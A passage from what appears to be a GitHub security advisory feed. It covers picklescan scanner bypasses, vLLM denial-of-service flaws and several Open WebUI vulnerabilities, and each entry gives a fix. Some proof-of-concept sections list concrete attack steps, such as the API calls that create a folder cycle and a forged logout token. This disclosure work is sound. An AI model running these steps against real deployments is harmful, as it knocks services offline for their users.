<p>picklescan before 0.0.25 fails to detect malicious pickle files that use timeit.timeit() in the <strong>reduce</strong> method, allowing remote code execution. Attackers can craft pickle files that import dangerous libraries like os and execute arbitrary system commands, which evade picklescan detection and execute when pickle.load() is called.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-v7x6-rv5q-mhwc">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-v7x6-rv5q-mhwc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71351">https://nvd.nist.gov/vuln/detail/CVE-2025-71351</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-timeit-timeit-detection-bypass">https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-timeit-timeit-detection-bypass</a></li>
<li><a href="https://github.com/advisories/GHSA-fh2f-24rh-r2vq">https://github.com/advisories/GHSA-fh2f-24rh-r2vq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fh2f-24rh-r2vq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-21T15:31:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan is missing detection when calling built-in python idlelib.pyshell.ModifiedInterpreter.runcommand]]></title>
        <id>https://github.com/advisories/GHSA-8mc5-7w9m-fqv6</id>
        <link href="https://github.com/advisories/GHSA-8mc5-7w9m-fqv6"/>
        <updated>2026-09-11T19:25:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-j343-8v2j-ff7w. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>picklescan before 0.0.30 fails to detect malicious pickle files using idlelib.pyshell.ModifiedInterpreter.runcommand in reduce methods. Attackers can embed undetected code in pickle files that executes remote commands when loaded by victims.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-j343-8v2j-ff7w">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-j343-8v2j-ff7w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71357">https://nvd.nist.gov/vuln/detail/CVE-2025-71357</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-arbitrary-code-execution-via-undetected-idlelib-pyshell-modifiedinterpreter-runcommand">https://www.vulncheck.com/advisories/picklescan-arbitrary-code-execution-via-undetected-idlelib-pyshell-modifiedinterpreter-runcommand</a></li>
<li><a href="https://github.com/advisories/GHSA-8mc5-7w9m-fqv6">https://github.com/advisories/GHSA-8mc5-7w9m-fqv6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8mc5-7w9m-fqv6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-21T15:31:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan is missing detection when calling built-in Python cProfile.runctx]]></title>
        <id>https://github.com/advisories/GHSA-fcqg-3mwf-cfcf</id>
        <link href="https://github.com/advisories/GHSA-fcqg-3mwf-cfcf"/>
        <updated>2026-09-11T19:20:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-9w88-8rmg-7g2p. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>picklescan before 0.0.30 fails to detect cProfile.runctx function calls in pickle file reduce methods, allowing attackers to execute arbitrary code. Malicious pickle files bypass picklescan detection and execute remote code when loaded via pickle.load().</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9w88-8rmg-7g2p">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9w88-8rmg-7g2p</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71378">https://nvd.nist.gov/vuln/detail/CVE-2025-71378</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-undetected-cprofile-runctx-in-pickle-files">https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-undetected-cprofile-runctx-in-pickle-files</a></li>
<li><a href="https://github.com/advisories/GHSA-fcqg-3mwf-cfcf">https://github.com/advisories/GHSA-fcqg-3mwf-cfcf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fcqg-3mwf-cfcf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-21T15:31:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM introduced enhanced protection for CVE-2025-62164]]></title>
        <id>https://github.com/advisories/GHSA-mcmc-2m55-j8jj</id>
        <link href="https://github.com/advisories/GHSA-mcmc-2m55-j8jj"/>
        <updated>2026-09-11T19:19:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The fix <a href="https://github.com/vllm-project/vllm/pull/27204">here</a> for CVE-2025-62164 is not sufficient. The fix only disables prompt embeds by default rather than addressing the root cause, so the DoS vulnerability remains when the feature is enabled.</p>
<h3 id="details">Details</h3>
<p>vLLM's pending change attempts to fix the root cause, which is the missing sparse tensor validation.  PyTorch (~v2.0) disables sparse tensor validation (specifically, sparse tensor invariants checks) by default for performance reasons.  vLLM is adding the sparse tensor validation to ensure indices are valid, non-negative, and within bounds.  These checks help catch malformed tensors.</p>
<h3 id="poc">PoC</h3>
<p>NA</p>
<h3 id="impact">Impact</h3>
<p>Current fix only added a flag to disable/enable prompt embeds, so by default, prompt embeds feature is disabled in vLLM, which stops DoS attacks through the embeddings.  However, It doesn’t address the problem when the flag is enabled and there is still potential for DoS attacks.</p>
<h3 id="changes">Changes</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/pull/30649">https://github.com/vllm-project/vllm/pull/30649</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-mcmc-2m55-j8jj">https://github.com/vllm-project/vllm/security/advisories/GHSA-mcmc-2m55-j8jj</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/30649">https://github.com/vllm-project/vllm/pull/30649</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-56340">https://access.redhat.com/security/cve/CVE-2026-56340</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2491060">https://bugzilla.redhat.com/show_bug.cgi?id=2491060</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/vllm/PYSEC-2026-250.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/vllm/PYSEC-2026-250.yaml</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-56340.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-56340.json</a></li>
<li><a href="https://www.vulncheck.com/advisories/vllm-denial-of-service-via-unvalidated-multimodal-embeddings">https://www.vulncheck.com/advisories/vllm-denial-of-service-via-unvalidated-multimodal-embeddings</a></li>
<li><a href="https://github.com/advisories/GHSA-mcmc-2m55-j8jj">https://github.com/advisories/GHSA-mcmc-2m55-j8jj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mcmc-2m55-j8jj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-01-08T21:47:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] Duplicate Advisory: vLLM introduced enhanced protection for CVE-2025-62164]]></title>
        <id>https://github.com/advisories/GHSA-78fp-cf4h-g36p</id>
        <link href="https://github.com/advisories/GHSA-78fp-cf4h-g36p"/>
        <updated>2026-09-11T19:18:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-mcmc-2m55-j8jj. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>vLLM versions &gt;= 0.10.2 and &lt; 0.13.0 are missing sparse tensor validation in multimodal embeddings processing. Because PyTorch disables sparse tensor invariant checks by default, an attacker can submit crafted embedding requests with malformed (negative or out-of-bounds) tensor indices, when the prompt-embeds feature is enabled, to trigger crashes or resource exhaustion (denial of service), with potential for out-of-bounds/write-what-where memory corruption. This continues CVE-2025-62164, whose prior fix only disabled the feature by default rather than addressing the root cause.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-mcmc-2m55-j8jj">https://github.com/vllm-project/vllm/security/advisories/GHSA-mcmc-2m55-j8jj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56340">https://nvd.nist.gov/vuln/detail/CVE-2026-56340</a></li>
<li><a href="https://www.vulncheck.com/advisories/vllm-denial-of-service-via-unvalidated-multimodal-embeddings">https://www.vulncheck.com/advisories/vllm-denial-of-service-via-unvalidated-multimodal-embeddings</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-56340">https://access.redhat.com/security/cve/CVE-2026-56340</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2491060">https://bugzilla.redhat.com/show_bug.cgi?id=2491060</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-56340.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-56340.json</a></li>
<li><a href="https://github.com/advisories/GHSA-78fp-cf4h-g36p">https://github.com/advisories/GHSA-78fp-cf4h-g36p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78fp-cf4h-g36p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-20T21:31:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] Duplicate Advisory: vLLM Vulnerable to Regular Expression Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-vfm7-4h43-gp6m</id>
        <link href="https://github.com/advisories/GHSA-vfm7-4h43-gp6m"/>
        <updated>2026-09-11T15:45:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-j828-28rj-hfhp. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>vLLM versions &gt;= 0.6.3 and &lt; 0.9.0 contain multiple regular expression denial of service (ReDoS) vulnerabilities. Several regex patterns — in vllm/lora/utils.py, the phi4mini tool parser, and the OpenAI-compatible serving chat endpoint — are susceptible to catastrophic backtracking. An attacker submitting crafted input with nested or repeated structures can trigger severe CPU consumption and performance degradation, resulting in denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-j828-28rj-hfhp">https://github.com/vllm-project/vllm/security/advisories/GHSA-j828-28rj-hfhp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71379">https://nvd.nist.gov/vuln/detail/CVE-2025-71379</a></li>
<li><a href="https://www.vulncheck.com/advisories/vllm-regular-expression-denial-of-service-in-multiple-components">https://www.vulncheck.com/advisories/vllm-regular-expression-denial-of-service-in-multiple-components</a></li>
<li><a href="https://github.com/advisories/GHSA-vfm7-4h43-gp6m">https://github.com/advisories/GHSA-vfm7-4h43-gp6m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vfm7-4h43-gp6m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-20T21:31:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Users denied by the OAuth role policy can still sign in via token exchange]]></title>
        <id>https://github.com/advisories/GHSA-wvm9-9g5j-623f</id>
        <link href="https://github.com/advisories/GHSA-wvm9-9g5j-623f"/>
        <updated>2026-09-10T23:04:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Open WebUI's OAuth token exchange endpoint issues a session for a provider access token without running the OAuth role management that the normal OAuth login callback runs. A user whose provider roles the login callback would refuse, or would demote, could still obtain a working session at their existing role through this endpoint.</p>
<h2 id="preconditions">Preconditions</h2>
<ul>
<li><code>ENABLE_OAUTH_TOKEN_EXCHANGE=True</code>. It is disabled by default, so a default deployment is not affected.</li>
<li><code>ENABLE_OAUTH_ROLE_MANAGEMENT=True</code> together with <code>OAUTH_ALLOWED_ROLES</code> or <code>OAUTH_ADMIN_ROLES</code>. Role management is off by default, and deployments not using it are not affected.</li>
<li>A valid, unexpired access token on the configured provider.</li>
<li>An Open WebUI account already linked to that provider subject, or an account with a matching email when <code>OAUTH_MERGE_ACCOUNTS_BY_EMAIL</code> is enabled. This endpoint never creates accounts, so a token for a subject with no existing account is rejected.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>An admin who relies on OAuth role management expects a user to lose access, or lose admin, as soon as the identity provider stops reporting the required role. The login callback does enforce this on the next sign-in. Token exchange kept issuing sessions and never re-evaluated the role, so the user retained working access as their existing account at its existing role, including an admin role the provider had already revoked. The endpoint cannot create an account and cannot raise anyone's role, so this grants continued access rather than new or elevated access.</p>
<h2 id="fix">Fix</h2>
<p>d799e81ed, released in 0.11.1, runs the same role evaluation on the provider's response that the login callback runs. The exchange is denied with 403 when the reported roles match no allowed or admin role, and the account's role is updated to match the provider otherwise. Upgrading restores the check with no further action.</p>
<h2 id="root-cause">Root cause</h2>
<p>The affected component is the OAuth token exchange endpoint in <code>backend/open_webui/routers/auths.py</code>, present in builds from 0.8.0 onward.</p>
<p>The endpoint was added as a second entry point into the same session-issuing path the OAuth login callback uses, but it re-implemented only the identity lookup and not the policy checks surrounding it. Role evaluation lived inside the callback's own body rather than in shared code, so the second caller inherited none of it.</p>
<h2 id="credits">Credits</h2>
<p>@Classic298</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-wvm9-9g5j-623f">https://github.com/open-webui/open-webui/security/advisories/GHSA-wvm9-9g5j-623f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-88006">https://nvd.nist.gov/vuln/detail/CVE-2026-88006</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/d799e81edbdc971c6deb096b6474cd95b93504bf">https://github.com/open-webui/open-webui/commit/d799e81edbdc971c6deb096b6474cd95b93504bf</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.11.1">https://github.com/open-webui/open-webui/releases/tag/v0.11.1</a></li>
<li><a href="https://github.com/advisories/GHSA-wvm9-9g5j-623f">https://github.com/advisories/GHSA-wvm9-9g5j-623f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wvm9-9g5j-623f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-10T23:04:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Unauthenticated requests can stall the server via uncached OIDC fetches in back-channel logout]]></title>
        <id>https://github.com/advisories/GHSA-3g9q-v48f-hh9w</id>
        <link href="https://github.com/advisories/GHSA-3g9q-v48f-hh9w"/>
        <updated>2026-09-10T22:45:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The OIDC back-channel logout endpoint is unauthenticated by design, because the identity provider calls it without a browser session. Before checking whether the submitted logout token was genuine, the handler fetched the provider's discovery document and its signing keys over the network, and repeated both fetches on every request because nothing was cached. The signing-key fetch also ran as a blocking call inside the async event loop. A small number of requests carrying a worthless token was therefore enough to make the whole instance stop answering.</p>
<h2 id="preconditions">Preconditions</h2>
<ul>
<li><code>ENABLE_OAUTH_BACKCHANNEL_LOGOUT=true</code>. The default is <code>False</code>, so a stock deployment is not affected. This setting is recommended in the Open WebUI hardening documentation, which is why the issue is treated as in scope.</li>
<li>At least one OIDC provider configured (<code>OAUTH_CLIENT_ID</code>, <code>OAUTH_CLIENT_SECRET</code>, <code>OPENID_PROVIDER_URL</code>).</li>
<li>No account, credential, session or secret identifier is required. The attacker needs network access to the instance and the configured issuer string, which is published in the provider's own discovery document.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Against 0.11.0, with the identity provider answering in 150 ms, 60 concurrent requests carrying a token whose signature was four characters long stalled the async event loop for 8.3 seconds, measured against an idle baseline of 10.8 ms. For the length of that stall the process answers nothing: no chat requests, no API calls, no health check. Open WebUI runs a single worker by default, so the effect is instance-wide rather than per-connection, and no rate limit sits in front of the endpoint.</p>
<p>The same traffic is also amplified outward: 20 sequential requests produced 20 discovery fetches and 40 key-set fetches at the identity provider, so an attacker can drive load onto the provider through the instance.</p>
<p>No data is read, modified or exposed, and the forged token is still rejected. The cost is paid before the rejection.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in 0.11.1. The handler now resolves both the discovery document and the signing keys through the already-configured OAuth client, so each is fetched once per provider and reused afterwards, and both fetches are asynchronous rather than blocking the event loop. A token carrying no <code>kid</code> header is rejected before any key lookup happens. Upgrading is sufficient, and no configuration change is required.</p>
<h2 id="root-cause">Root cause</h2>
<p>Affected component: the OIDC back-channel logout handler in <code>backend/open_webui/utils/oauth.py</code>, reached through <code>POST /oauth/backchannel-logout</code>. Affected setups: releases 0.9.0 through 0.11.0 with back-channel logout enabled and an OIDC provider configured.</p>
<p>The handler treated its network work as cheap preparation rather than as work worth protecting. For every request it opened a new HTTP session per configured provider to re-read the discovery document, then constructed a fresh JWKS client, whose own cache consequently started empty each time, and asked that client for the signing key through a synchronous call issued directly on the event loop. All of this ran before the token signature was verified, so an attacker unable to produce a valid token still cost the server two network round trips and a blocked loop per request. Both fetches used the library default timeout of five minutes.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Reproduced by running the unmodified handler from the 0.11.0 and 0.11.1 backends against a loopback identity provider that counted every inbound request and could answer with a configured delay. The submitted token carried a valid issuer and audience, a <code>kid</code> naming a key the provider does not hold, and <code>AAAA</code> as its signature.</p>
<p>20 sequential requests, provider answering immediately:</p>
<table>
<thead>
<tr>
<th>Version</th>
<th>Discovery fetches</th>
<th>Key-set fetches</th>
<th>Response</th>
</tr>
</thead>
<tbody><tr>
<td>0.11.0</td>
<td>20</td>
<td>40</td>
<td>400</td>
</tr>
<tr>
<td>0.11.1</td>
<td>1</td>
<td>1</td>
<td>400</td>
</tr>
</tbody></table>
<p>60 concurrent requests, provider answering in 150 ms:</p>
<table>
<thead>
<tr>
<th>Version</th>
<th>Wall time</th>
<th>Discovery fetches</th>
<th>Key-set fetches</th>
<th>Worst event-loop stall</th>
</tr>
</thead>
<tbody><tr>
<td>0.11.0</td>
<td>18.6 s</td>
<td>60</td>
<td>120</td>
<td>8255 ms</td>
</tr>
<tr>
<td>0.11.1</td>
<td>under 0.01 s</td>
<td>0</td>
<td>0</td>
<td>none measurable</td>
</tr>
</tbody></table>
<p>Idle event-loop stall was 10.8 ms in both cases. On 0.11.1 the first request an instance receives warms both caches, and every request after that reaches the signature check without any outbound network call.</p>
<h2 id="credits">Credits</h2>
<p>@galanko, for reporting the issue and identifying both the missing caching and the blocking call.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-3g9q-v48f-hh9w">https://github.com/open-webui/open-webui/security/advisories/GHSA-3g9q-v48f-hh9w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-87011">https://nvd.nist.gov/vuln/detail/CVE-2026-87011</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/aeda6ff13a25d3b3ba1b303609f35382db22142c">https://github.com/open-webui/open-webui/commit/aeda6ff13a25d3b3ba1b303609f35382db22142c</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.11.1">https://github.com/open-webui/open-webui/releases/tag/v0.11.1</a></li>
<li><a href="https://github.com/advisories/GHSA-3g9q-v48f-hh9w">https://github.com/advisories/GHSA-3g9q-v48f-hh9w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3g9q-v48f-hh9w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-10T22:44:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Any authenticated user can suppress calendar alerts instance-wide via a non-numeric alert value]]></title>
        <id>https://github.com/advisories/GHSA-v39v-59xw-j98g</id>
        <link href="https://github.com/advisories/GHSA-v39v-59xw-j98g"/>
        <updated>2026-09-10T22:42:48.000Z</updated>
        <content type="html"><![CDATA[<h1 id="any-authenticated-user-can-suppress-calendar-alerts-instance-wide-via-a-non-numeric-alert-value">Any authenticated user can suppress calendar alerts instance-wide via a non-numeric alert value</h1>
<h2 id="summary">Summary</h2>
<p>Calendar events carry a free-form <code>meta</code> object that is stored exactly as submitted, with no validation of the values inside it. The scheduler reads the per-event alert offset out of that object in a single pass that covers every user's upcoming events, and compares it numerically without checking that it is a number. Any verified user could store a text value there, which made the comparison raise and abort the whole pass, so no calendar reminder fired for anyone on the instance while that event stayed inside the lookahead window.</p>
<h2 id="preconditions">Preconditions</h2>
<ul>
<li>Calendar is enabled (<code>ENABLE_CALENDAR</code> / <code>calendar.enable</code>, default <code>True</code>).</li>
<li>The attacker is a verified user (role <code>user</code> or <code>admin</code>) holding the <code>calendar</code> feature permission, which is granted to all users by default (<code>USER_PERMISSIONS_FEATURES_CALENDAR</code>, default <code>True</code>).</li>
<li>The event's start time falls inside the scheduler's one hour lookahead window, so the shared alert pass selects it.</li>
</ul>
<p>No admin access, no shared calendar, no recurrence rule and no open registration are required, an invited account is enough. Deployments running with the calendar disabled, or with the calendar feature permission removed from regular users, are not affected.</p>
<h2 id="impact">Impact</h2>
<p>Availability loss on one feature, affecting every user on the instance. While a single event carrying a non-numeric alert value sat in the upcoming window, the shared alert pass raised before emitting anything, so no user received calendar alerts and no event was recorded as alerted. The same events were selected again on the next poll, so the suppression lasted as long as the event stayed in the window, roughly one hour per event, and could be sustained by storing a new one. Every user on a default deployment holds the permission needed to do this.</p>
<p>Chat, timers, automations and the HTTP API kept working throughout, and authenticated calendar reads continued to succeed. There is no crash, no code execution, and no access to other users' data. Alerts resumed on their own once the event left the window or was deleted.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in <a href="https://github.com/open-webui/open-webui/pull/28790">https://github.com/open-webui/open-webui/pull/28790</a>, released in 0.11.1. The scheduler now treats any non-numeric alert value as unset and falls back to the default alert offset, so a stored text value can no longer interrupt the pass. Upgrading is sufficient and no configuration change is required. Events already holding a bad value simply revert to the default alert timing.</p>
<h2 id="root-cause">Root cause</h2>
<p>Affected component: the upcoming-event lookup in the calendar event model, which the scheduler's alert pass calls every poll. Affected setup: every build carrying the calendar feature, which was introduced in 0.9.0.</p>
<p>Event <code>meta</code> is an untyped dictionary and was written to the database exactly as submitted, so nothing on the write path guaranteed that the alert offset was a number. The alert pass then read that value back and compared it numerically on the assumption that the write path had already constrained it, and the loop had no per-event error handling. Because a single background pass serves the whole instance rather than one user at a time, one unusable value from one user aborted the pass for everyone.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Reported with a scripted reproduction against 0.11.0 (<code>ghcr.io/open-webui/open-webui:latest</code>) with the calendar enabled and two ordinary user accounts. The first account created an upcoming event with the alert offset stored as the text <code>"5"</code>, the second created a normal upcoming event with a numeric offset. Across several scheduler polls the second user's event was never marked as alerted and no alert was delivered, while the server logged a type error from the alert pass on each poll. Health checks and authenticated calendar reads returned normally during the fault. After the first account's event was deleted, the second user's event was marked as alerted on the next poll and alerting resumed.</p>
<h2 id="credits">Credits</h2>
<p>Binbin Xu​ of Tencent YUNDING LAB CodeBuddy Security.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-v39v-59xw-j98g">https://github.com/open-webui/open-webui/security/advisories/GHSA-v39v-59xw-j98g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-87012">https://nvd.nist.gov/vuln/detail/CVE-2026-87012</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/28790">https://github.com/open-webui/open-webui/pull/28790</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/abc69000b33b4894fbd97fc2c962139cf9a8d784">https://github.com/open-webui/open-webui/commit/abc69000b33b4894fbd97fc2c962139cf9a8d784</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.11.1">https://github.com/open-webui/open-webui/releases/tag/v0.11.1</a></li>
<li><a href="https://github.com/advisories/GHSA-v39v-59xw-j98g">https://github.com/advisories/GHSA-v39v-59xw-j98g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v39v-59xw-j98g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-10T22:42:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Any authenticated user can start a non-terminating request via a folder parent cycle]]></title>
        <id>https://github.com/advisories/GHSA-8r35-5x5r-hv74</id>
        <link href="https://github.com/advisories/GHSA-8r35-5x5r-hv74"/>
        <updated>2026-09-10T22:42:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Any authenticated user can move one of their own folders under itself, leaving a loop in their folder tree. The re-parent endpoint performed no check that the new parent was not the folder itself or one of its own subfolders, and the folder tree walks did not track which folders they had already visited. A single request against a folder in a loop therefore never finishes.</p>
<h2 id="preconditions">Preconditions</h2>
<p>Folders must be enabled (<code>ENABLE_FOLDERS</code>, default true) and the acting user's role must hold the folders feature permission (<code>USER_PERMISSIONS_FEATURES_FOLDERS</code>, default true). Both are on in a default install. Any authenticated account is sufficient: no administrator, no second user, no shared folder and no victim interaction. Deployments that disable folders, or withhold the folders feature permission from non-admin roles, are not affected.</p>
<h2 id="impact">Impact</h2>
<p>A single request that never returns. It keeps running after the client disconnects, holds a CPU core and grows its in-memory folder list at roughly 0.6 GB per hour until the process is restarted. The folder stays in the looping state in the database, so any later request touching that folder starts the loop again.</p>
<p>The instance stays responsive while this happens. Each step of the walk waits on a database query, so other users continue to be served normally; measured on a default install, two concurrent instances of this request left unrelated users unaffected, and roughly 900 concurrent requests were needed before anyone else saw a slowdown. Nothing is denied to any other party at the time of the attack, and an unattended instance degrades over hours rather than immediately. No user data is exposed and no data belonging to another user is modified.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in 0.11.1 by <a href="https://github.com/open-webui/open-webui/pull/28748">https://github.com/open-webui/open-webui/pull/28748</a>. Moving a folder into itself or into one of its own subfolders is now rejected with a 400, every folder tree walk skips ids it has already visited, and a folder whose parent chain loops is returned to the root the next time the folder list is requested. An instance that already holds folders in this state recovers on upgrade with no operator action.</p>
<h2 id="root-cause">Root cause</h2>
<p>Affected components: the folder re-parent handler <code>POST /api/v1/folders/{id}/update/parent</code>, the subtree walk in the folder model that expands a folder into its descendants, and the two endpoints that call it, <code>DELETE /api/v1/folders/{id}</code> and <code>POST /api/v1/folders/{id}/read</code>. Affected setup: the subtree walk was introduced in 0.10.0, so no earlier release carries the code.</p>
<p>The folder hierarchy is stored as a plain parent reference per folder, with the acyclic property assumed rather than enforced. The write path never validated that assumption, and the read paths were written as if it always held, so nothing on either side would notice or stop a loop.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Reproduced against a default 0.11.0 install. As an ordinary authenticated user:</p>
<ol>
<li>Create a folder and note its id.</li>
<li><code>POST /api/v1/folders/{id}/update/parent</code> with <code>parent_id</code> set to that same id. The request is accepted.</li>
<li><code>DELETE /api/v1/folders/{id}</code> (or <code>POST /api/v1/folders/{id}/read</code>). The request never returns, and the worker continues running after the client disconnects.</li>
</ol>
<p>No data was seeded directly into the database. Every step ran through the public API.</p>
<h2 id="credits">Credits</h2>
<p>@luida-ikura, who reported the folder parent cycle and the non-terminating subtree walk it reaches.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-8r35-5x5r-hv74">https://github.com/open-webui/open-webui/security/advisories/GHSA-8r35-5x5r-hv74</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-87013">https://nvd.nist.gov/vuln/detail/CVE-2026-87013</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/28748">https://github.com/open-webui/open-webui/pull/28748</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/23b3a69bc26839bfa74edd1be6bfa2568ae902f4">https://github.com/open-webui/open-webui/commit/23b3a69bc26839bfa74edd1be6bfa2568ae902f4</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.11.1">https://github.com/open-webui/open-webui/releases/tag/v0.11.1</a></li>
<li><a href="https://github.com/advisories/GHSA-8r35-5x5r-hv74">https://github.com/advisories/GHSA-8r35-5x5r-hv74</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8r35-5x5r-hv74</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-10T22:42:25.000Z</published>
    </entry>
    <entry>
